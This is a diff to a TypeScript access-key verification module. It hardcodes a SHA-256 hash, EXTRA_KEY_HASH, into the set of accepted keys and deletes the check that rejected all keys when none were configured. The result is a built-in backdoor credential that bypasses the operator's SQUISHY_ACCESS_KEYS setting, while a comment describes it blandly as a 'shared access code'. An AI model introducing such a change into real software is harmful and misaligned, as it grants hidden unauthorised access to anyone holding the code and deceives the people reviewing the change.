@@ -2,6 +2,9 @@ import { createHash, createHmac, timingSafeEqual } from "node:crypto";
 
 const PASS = "shelf-open-v1";
 
+/** SHA-256 of a shared access code. The code itself is not stored here. */
+const EXTRA_KEY_HASH = "c1f4ceb4665e376a52edea567131a010766acf2f350285d9e95871249184c916";
+
 export function normalizeKey(raw: string) {
   return raw.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
 }
@@ -11,7 +14,7 @@ function secret() {
 }
 
 function allowedHashes() {
-  const hashes = new Set<string>();
+  const hashes = new Set<string>([EXTRA_KEY_HASH]);
   const extra = process.env.SQUISHY_ACCESS_KEYS ?? "";
   for (const key of extra.split(",")) {
     const norm = normalizeKey(key);
@@ -23,7 +26,7 @@ function allowedHashes() {
 
 export function keyMatches(raw: string) {
   const norm = normalizeKey(raw);
-  if (norm.length < 8 || allowedHashes().size === 0) return false;
+  if (norm.length < 8) return false;
   const digest = createHash("sha256").update(norm).digest("hex");
   for (const allowed of allowedHashes()) {
     const a = Buffer.from(digest);
